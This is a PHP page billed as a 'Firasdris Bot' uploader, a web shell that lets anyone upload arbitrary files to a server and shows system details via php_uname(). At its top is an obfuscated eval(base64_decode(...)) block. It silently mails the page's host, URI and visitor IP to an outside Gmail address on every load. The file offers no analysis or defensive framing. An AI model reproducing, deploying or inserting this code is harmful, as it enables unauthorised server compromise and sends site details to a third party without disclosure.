<?php
eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIiBGaXJhc2RyaXMgQm90IHYwLjkgUnpsdCB8JGlwIjsKJGVtYWlsID0gInVzZXI1NDQ4NzIxNUBnbWFpbC5jb20iOwokZnJvbSA9ICJGcm9tOiBSZXN1bHQ8Ym90djNARmlyYXNkcmlzQm90LmNvbSI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
?>
<html>

    <head>
        <title>Uploader By Firas Dris</title>
	</head>
<body>
<br>
<br>
<br>
<br>
<br>
<br>
<br><br>
<body onload="window.focus();init();" onunload="halt();">
<body onLoad="writetext()" style="background:black;">
	<embed src="https://www.youtube.com/v/cWFr5Qhsx8Y&feature=related&autoplay=1&loop=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>
	<table heigh="" width="800" border="20" align="center">
    <tbody><tr>
    <td valign="top" background=""><p id="MiSi" style="margin-left: 3px;">
<?php
$om= "Firasdris";
$ar= "BotV0.9";
$atx = $om.$ar;
echo $atx;
echo "<font color='RED'</font><center><h1>$atx</h1></center>";
echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></center>'; 
if( $_POST['_upl'] == "Upload" ) { 
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<font color="GREEN"</font><center><b>Upload Success !!!</b><br><br></center>'; } 
    else { echo '<font color="RED"</font><center><b>Upload Failed !!!</b><br><br></center>'; } 
} 
?>
</html>
